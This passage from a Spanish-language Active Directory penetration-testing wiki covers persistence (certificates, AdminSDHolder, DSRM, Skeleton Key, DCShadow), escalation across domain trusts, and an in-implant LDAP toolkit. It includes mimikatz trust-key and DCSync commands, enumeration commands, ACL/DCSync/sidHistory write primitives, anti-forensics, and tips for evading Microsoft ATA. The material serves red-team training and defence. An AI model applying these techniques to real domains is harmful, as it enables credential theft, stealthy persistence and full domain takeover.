**Tener certificados de una cuenta o poder solicitarlos** es una muy buena forma de persistir en la cuenta del usuario (incluso si cambia la contraseña):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Usar certificados también permite persistir con altos privilegios dentro del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

El objeto **AdminSDHolder** en Active Directory asegura la protección de **grupos privilegiados** (como Domain Admins y Enterprise Admins) aplicando una ACL estándar a través de estos grupos para evitar cambios no autorizados. Sin embargo, esta característica puede explotarse; si un atacante modifica la ACL de AdminSDHolder para dar acceso total a un usuario normal, ese usuario obtiene control extenso sobre todos los grupos privilegiados. Esta medida de seguridad, diseñada para proteger, puede volverse contraproducente y permitir accesos indebidos a menos que se supervise estrechamente.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Dentro de cada **Domain Controller (DC)** existe una cuenta de **administrador local**. Al obtener privilegios de administrador en una de esas máquinas, el hash del Administrator local puede extraerse usando **mimikatz**. Después de esto, es necesario modificar el registro para **habilitar el uso de esta contraseña**, permitiendo el acceso remoto a la cuenta Administrator local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Podrías **dar** algunos **permisos especiales** a un **usuario** sobre ciertos objetos de dominio que permitirán al usuario **escalar privilegios en el futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Los **security descriptors** se usan para **almacenar** los **permisos** que un **objeto** tiene **sobre** otro **objeto**. Si puedes simplemente **hacer** un **pequeño cambio** en el **security descriptor** de un objeto, puedes obtener privilegios muy interesantes sobre ese objeto sin necesitar ser miembro de un grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abusa de la clase auxiliar `dynamicObject` para crear principals/GPOs/registros DNS de corta duración con `entryTTL`/`msDS-Entry-Time-To-Die`; se auto-eliminan sin tombstones, borrando evidencia LDAP mientras dejan SIDs huérfanos, referencias `gPLink` rotas, o respuestas DNS en caché (por ejemplo, AdminSDHolder ACE pollution o `gPCFileSysPath` malicioso/redirecciones DNS integradas en AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Alterar **LSASS** en memoria para establecer una **contraseña universal**, otorgando acceso a todas las cuentas del dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puedes crear tu **propio SSP** para **capturar** en **texto claro** las **credenciales** usadas para acceder a la máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuevo Domain Controller** en el AD y lo usa para **empujar atributos** (SIDHistory, SPNs...) sobre objetos especificados **sin** dejar **logs** respecto a las **modificaciones**. Necesitas privilegios DA y estar dentro del **root domain**.\
Nota que si usas datos incorrectos, aparecerán logs bastante feos.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Anteriormente hemos comentado cómo escalar privilegios si tienes **suficientes permisos para leer contraseñas LAPS**. Sin embargo, estas contraseñas también pueden usarse para **mantener persistencia**.\
Consulta:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considera el **Forest** como el límite de seguridad. Esto implica que **comprometer un solo dominio podría potencialmente llevar a comprometer todo el Forest**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) es un mecanismo de seguridad que permite a un usuario de un **dominio** acceder a recursos en otro **dominio**. Esencialmente crea un enlace entre los sistemas de autenticación de los dos dominios, permitiendo que las verificaciones de autenticación fluyan sin problemas. Cuando los dominios establecen una trust, intercambian y retienen ciertas **keys** dentro de sus **Domain Controllers (DCs)**, que son cruciales para la integridad de la trust.

En un escenario típico, si un usuario pretende acceder a un servicio en un **dominio confiable**, primero debe solicitar un ticket especial conocido como **inter-realm TGT** desde el DC de su propio dominio. Este TGT está cifrado con una **key** compartida que ambos dominios han acordado. El usuario entonces presenta este TGT al **DC del dominio confiable** para obtener un service ticket (**TGS**). Tras la validación exitosa del inter-realm TGT por parte del DC del dominio confiable, éste emite un TGS, otorgando al usuario acceso al servicio.

**Pasos**:

1. Un **cliente** en **Domain 1** inicia el proceso usando su **NTLM hash** para solicitar un **Ticket Granting Ticket (TGT)** a su **Domain Controller (DC1)**.
2. DC1 emite un nuevo TGT si el cliente se autentica correctamente.
3. El cliente entonces solicita un **inter-realm TGT** a DC1, que es necesario para acceder a recursos en **Domain 2**.
4. El inter-realm TGT está cifrado con una **trust key** compartida entre DC1 y DC2 como parte de la two-way domain trust.
5. El cliente lleva el inter-realm TGT al **Domain Controller (DC2)** de **Domain 2**.
6. DC2 verifica el inter-realm TGT usando su trust key compartida y, si es válido, emite un **Ticket Granting Service (TGS)** para el servidor en Domain 2 al que el cliente quiere acceder.
7. Finalmente, el cliente presenta este TGS al servidor, el cual está cifrado con el hash de la cuenta del servidor, para obtener acceso al servicio en Domain 2.

### Different trusts

Es importante notar que **una trust puede ser de 1 vía o 2 vías**. En la opción de 2 vías, ambos dominios se confiarán mutuamente, pero en la relación de trust **de 1 vía** uno de los dominios será el **trusted** y el otro el **trusting**. En este último caso, **solo podrás acceder a recursos dentro del trusting domain desde el trusted**.

Si Domain A confía en Domain B, A es el trusting domain y B es el trusted. Además, en **Domain A**, esto sería un **Outbound trust**; y en **Domain B**, esto sería un **Inbound trust**.

**Diferentes relaciones de confianza**

- **Parent-Child Trusts**: Configuración común dentro del mismo forest, donde un dominio hijo tiene automáticamente una two-way transitive trust con su dominio padre. Esencialmente, esto significa que las peticiones de autenticación pueden fluir sin problemas entre el padre y el hijo.
- **Cross-link Trusts**: Referidas como "shortcut trusts", se establecen entre dominios hijos para acelerar procesos de referral. En forests complejos, las referencias de autenticación típicamente deben viajar hasta la raíz del forest y luego bajar al dominio objetivo. Al crear cross-links, el recorrido se acorta, lo cual es especialmente beneficioso en entornos geográficamente dispersos.
- **External Trusts**: Se configuran entre dominios distintos y no relacionados y son no-transitive por naturaleza. Según la documentación de [Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), las external trusts son útiles para acceder a recursos en un dominio fuera del forest actual que no está conectado por una forest trust. La seguridad se refuerza mediante SID filtering con external trusts.
- **Tree-root Trusts**: Estas trusts se establecen automáticamente entre el forest root domain y un nuevo tree root añadido. Aunque no son comunes, las tree-root trusts son importantes para añadir nuevos árboles de dominio a un forest, permitiendo que mantengan un nombre de dominio único y asegurando transitivez two-way. Más información en la [guía de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Este tipo de trust es una two-way transitive trust entre dos forest root domains, aplicando también SID filtering para mejorar las medidas de seguridad.
- **MIT Trusts**: Estas trusts se establecen con dominios Kerberos no-Windows, compatibles con [RFC4120](https://tools.ietf.org/html/rfc4120). Las MIT trusts son más especializadas y atienden a entornos que requieren integración con sistemas basados en Kerberos fuera del ecosistema Windows.

#### Other differences in **trusting relationships**

- Una relación de trust también puede ser **transitive** (A trust B, B trust C, entonces A trust C) o **non-transitive**.
- Una relación de trust puede configurarse como **bidirectional trust** (ambos se confían) o como **one-way trust** (solo uno confía en el otro).

### Attack Path

1. **Enumerar** las relaciones de confianza
2. Comprobar si algún **security principal** (user/group/computer) tiene **acceso** a recursos del **otro dominio**, quizás por entradas ACE o por pertenecer a grupos del otro dominio. Busca **relaciones a través de dominios** (probablemente la trust se creó para esto).
1. kerberoast en este caso podría ser otra opción.
3. **Comprometer** las **cuentas** que puedan **pivotar** entre dominios.

Los atacantes podrían acceder a recursos en otro dominio a través de tres mecanismos primarios:

- **Local Group Membership**: Principales pueden ser añadidos a grupos locales en máquinas, como el grupo “Administrators” en un servidor, otorgándoles control significativo sobre esa máquina.
- **Foreign Domain Group Membership**: Principales también pueden ser miembros de grupos dentro del dominio externo. Sin embargo, la efectividad de este método depende de la naturaleza de la trust y del alcance del grupo.
- **Access Control Lists (ACLs)**: Principales pueden estar especificados en una **ACL**, particularmente como entidades en **ACEs** dentro de una **DACL**, proporcionándoles acceso a recursos específicos. Para quienes quieran profundizar en la mecánica de ACLs, DACLs y ACEs, el whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” es un recurso invaluable.

### Find external users/groups with permissions

Puedes comprobar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar foreign security principals en el dominio. Estos serán usuarios/grupos de **un dominio/forest externo**.

Puedes verificar esto en **Bloodhound** o usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Otras formas de enumerar las relaciones de confianza de dominio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Hay **2 trusted keys**, una para _Child --> Parent_ y otra para _Parent_ --> _Child_.\
> Puedes identificar la que usa el dominio actual con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalar a Enterprise Admin al dominio child/parent abusando del trust con SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Comprender cómo se puede explotar el Configuration Naming Context (NC) es crucial. El Configuration NC sirve como repositorio central para los datos de configuración a lo largo de un forest en entornos de Active Directory (AD). Estos datos se replican a todos los Domain Controller (DC) dentro del forest, y los DCs escribibles mantienen una copia escribible del Configuration NC. Para explotarlo, se necesitan **privilegios SYSTEM en un DC**, preferiblemente un child DC.

**Link GPO to root DC site**

El contenedor Sites del Configuration NC incluye información sobre los sitios de todos los equipos unidos al dominio dentro del forest de AD. Al operar con privilegios SYSTEM en cualquier DC, un atacante puede linkear GPOs a los sitios root DC. Esta acción puede comprometer el dominio raíz al manipular las políticas aplicadas a esos sitios.

Para información detallada, se puede consultar la investigación sobre [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vector de ataque consiste en dirigirse a gMSAs privilegiados dentro del dominio. La KDS Root key, esencial para calcular las contraseñas de los gMSAs, se almacena en el Configuration NC. Con privilegios SYSTEM en cualquier DC, es posible acceder a la KDS Root key y calcular las contraseñas de cualquier gMSA en todo el forest.

Análisis detallado y guía paso a paso se pueden encontrar en:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementario de MSA delegado (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Investigación externa adicional: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Este método requiere paciencia, esperar la creación de nuevos objetos AD privilegiados. Con privilegios SYSTEM, un atacante puede modificar el AD Schema para otorgar a cualquier usuario control completo sobre todas las clases. Esto podría conducir a acceso no autorizado y control sobre objetos AD recién creados.

Lectura adicional disponible en [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnerabilidad ADCS ESC5 apunta a tomar control sobre objetos de Public Key Infrastructure (PKI) para crear una plantilla de certificado que permita autenticarse como cualquier usuario dentro del forest. Como los objetos PKI residen en el Configuration NC, comprometer un child DC escribible permite ejecutar ataques ESC5.

Se pueden leer más detalles en [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). En escenarios sin ADCS, el atacante puede montar los componentes necesarios, como se discute en [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
En este escenario **tu dominio es confiado por uno externo**, dándote **permisos indeterminados** sobre él. Necesitarás averiguar **qué principals de tu dominio tienen qué acceso sobre el dominio externo** y luego intentar explotarlo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Dominio de Bosque Externo - Unidireccional (Saliente)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
En este escenario **tu dominio** está **confiando** algunos **privilegios** a un principal de **dominios diferentes**.

Sin embargo, cuando un **dominio es confiado** por el dominio que confía, el dominio confiado **crea un usuario** con un **nombre predecible** que usa como **contraseña la contraseña del dominio confiado**. Lo que significa que es posible **utilizar un usuario del dominio que confía para entrar en el dominio confiado** para enumerarlo y tratar de escalar más privilegios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Otra forma de comprometer el dominio confiado es encontrar un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creado en la **dirección opuesta** de la confianza de dominio (lo cual no es muy común).

Otra forma de comprometer el dominio confiado es esperar en una máquina a la que un **usuario del dominio confiado puede acceder** para iniciar sesión vía **RDP**. Entonces, el atacante podría inyectar código en el proceso de la sesión RDP y **acceder al dominio de origen de la víctima** desde allí.\
Además, si la **víctima montó su disco duro**, desde el proceso de la **sesión RDP** el atacante podría almacenar **backdoors** en la **carpeta de inicio del disco duro**. Esta técnica se llama **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigación del abuso de confianza de dominio

### **SID Filtering:**

- El riesgo de ataques que aprovechan el atributo SID history a través de forest trusts se mitiga mediante SID Filtering, que está activado por defecto en todas las inter-forest trusts. Esto se basa en la suposición de que las intra-forest trusts son seguras, considerando el bosque, en lugar del dominio, como el límite de seguridad según la postura de Microsoft.
- Sin embargo, hay una trampa: SID Filtering podría interrumpir aplicaciones y el acceso de usuarios, lo que lleva a su desactivación ocasional.

### **Selective Authentication:**

- Para inter-forest trusts, emplear Selective Authentication asegura que los usuarios de los dos bosques no se autentican automáticamente. En su lugar, se requieren permisos explícitos para que los usuarios accedan a dominios y servidores dentro del dominio o bosque que confía.
- Es importante notar que estas medidas no protegen contra la explotación del writable Configuration Naming Context (NC) ni contra ataques a la cuenta de trust.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Abuso de AD basado en LDAP desde implantes en el host

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Enumeración LDAP del lado del implante

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resuelven nombres cortos/rutas OU en DNs completos y vuelcan los objetos correspondientes.
- `get-object`, `get-attribute`, and `get-domaininfo` obtienen atributos arbitrarios (incluyendo descriptores de seguridad) además de los metadatos de bosque/dominio desde `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` exponen roasting candidates, configuraciones de delegación y descriptores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) directamente desde LDAP.
- `get-acl` and `get-writable --detailed` analizan el DACL para listar trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) y la herencia, proporcionando objetivos inmediatos para escalada de privilegios mediante ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitivas de escritura LDAP para escalada y persistencia

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) permiten al operador preparar nuevas entidades o cuentas de máquina donde existan derechos sobre la OU. `add-groupmember`, `set-password`, `add-attribute`, y `set-attribute` secuestran directamente objetivos una vez que se encuentran write-property rights.
- Comandos centrados en ACL como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, y `add-dcsync` traducen WriteDACL/WriteOwner en cualquier objeto AD a restablecimientos de contraseña, control de membresía de grupo o privilegios de replicación DCSync sin dejar artefactos de PowerShell/ADSI. Las contrapartes `remove-*` limpian los ACEs inyectados.

### Delegación, roasting, y abuso de Kerberos

- `add-spn`/`set-spn` convierten instantáneamente a un usuario comprometido en Kerberoastable; `add-asreproastable` (toggle UAC) lo marca para AS-REP roasting sin tocar la contraseña.
- Las macros de delegación (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) reescriben `msDS-AllowedToDelegateTo`, banderas UAC, o `msDS-AllowedToActOnBehalfOfOtherIdentity` desde el beacon, habilitando rutas de ataque constrained/unconstrained/RBCD y eliminando la necesidad de PowerShell remoto o RSAT.

### Inyección de sidHistory, reubicación de OU y moldeado de la superficie de ataque

- `add-sidhistory` inyecta SIDs privilegiados en el SID history de una entidad controlada (ver [SID-History Injection](sid-history-injection.md)), proporcionando herencia de acceso sigilosa completamente sobre LDAP/LDAPS.
- `move-object` cambia el DN/OU de equipos o usuarios, permitiendo que un atacante arrastre activos a OUs donde ya existen derechos delegados antes de abusar de `set-password`, `add-groupmember` o `add-spn`.
- Comandos de eliminación de alcance estrecho (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permiten una reversión rápida después de que el operador coseche credenciales o persistencia, minimizando la telemetría.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algunas defensas generales

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Medidas defensivas para la protección de credenciales**

- **Restricciones para Domain Admins**: Se recomienda que Domain Admins solo puedan iniciar sesión en Domain Controllers, evitando su uso en otros hosts.
- **Privilegios de cuentas de servicio**: Los servicios no deberían ejecutarse con privilegios de Domain Admin (DA) para mantener la seguridad.
- **Limitación temporal de privilegios**: Para tareas que requieren privilegios DA, su duración debe limitarse. Esto se puede lograr con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigación de LDAP relay**: Auditar Event IDs 2889/3074/3075 y luego aplicar LDAP signing además de LDAPS channel binding en DCs/clientes para bloquear intentos de LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementación de técnicas de engaño**

- Implementar engaños implica colocar trampas, como usuarios o equipos señuelo, con características como contraseñas que no expiran o marcados como Trusted for Delegation. Un enfoque detallado incluye crear usuarios con derechos específicos o agregarlos a grupos de alto privilegio.
- Un ejemplo práctico implica usar herramientas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Más información sobre el despliegue de técnicas de engaño se puede encontrar en [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificando engaños**

- **Para objetos de usuario**: Indicadores sospechosos incluyen ObjectSID atípico, inicios de sesión poco frecuentes, fechas de creación y bajo recuento de contraseñas incorrectas.
- **Indicadores generales**: Comparar atributos de objetos señuelo potenciales con los de objetos genuinos puede revelar inconsistencias. Herramientas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) pueden ayudar a identificar tales engaños.

### **Evasión de sistemas de detección**

- **Evasión de detección de Microsoft ATA**:
- **Enumeración de usuarios**: Evitar la enumeración de sesiones en Domain Controllers para prevenir la detección por ATA.
- **Suplantación de tickets**: Utilizar **aes** keys para la creación de tickets ayuda a evadir la detección al no degradar a NTLM.
- **Ataques DCSync**: Se recomienda ejecutar desde un equipo que no sea Domain Controller para evitar la detección por ATA, ya que la ejecución directa desde un Domain Controller generará alertas.

## Referencias

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
